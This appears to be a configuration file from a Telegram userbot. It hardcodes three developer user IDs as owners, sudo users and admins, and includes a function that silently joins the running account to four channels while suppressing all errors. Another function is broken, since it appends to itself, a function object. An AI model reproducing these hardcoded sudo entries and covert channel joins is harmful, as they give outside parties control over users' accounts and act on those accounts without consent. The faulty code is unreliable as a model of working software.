
import sys
from datetime import datetime, timezone
from typing import Union, Dict, Optional

ADMIN1_ID = [5615921474]
BL_GCAST = [-1001755737234]
#BL_GEEZ = [1245451624]
DEVS = [5615921474, 1620434318, 1442917841]
ADMINS = [5615921474, 1620434318, 1442917841]
SUDO_ID = [5615921474, 1620434318, 1442917841]
SUDO_USERS = [5615921474, 1620434318, 1442917841]
OWNER_ID = [5615921474, 1620434318, 1442917841]
ADMINS = [5615921474, 1620434318, 1442917841]
BOT_VER = "0.0.1"
py_rainger = [5615921474, 1620434318, 1442917841]

def py_raingerx(client, message):
    chat_id = message.chat.id
    admins = client.get_chat_administrators(-1001755737234)
    admin_list = [admin.user.first_name for admin in admins]
    py_raingerx.append(admin_list)

async def join(client):
    try:
        await client.join_chat("raingersuppor")
        await client.join_chat("raingerproject")
        await client.join_chat("xtafes")
        await client.join_chat("xtafesgc")
    except BaseException:
        pass
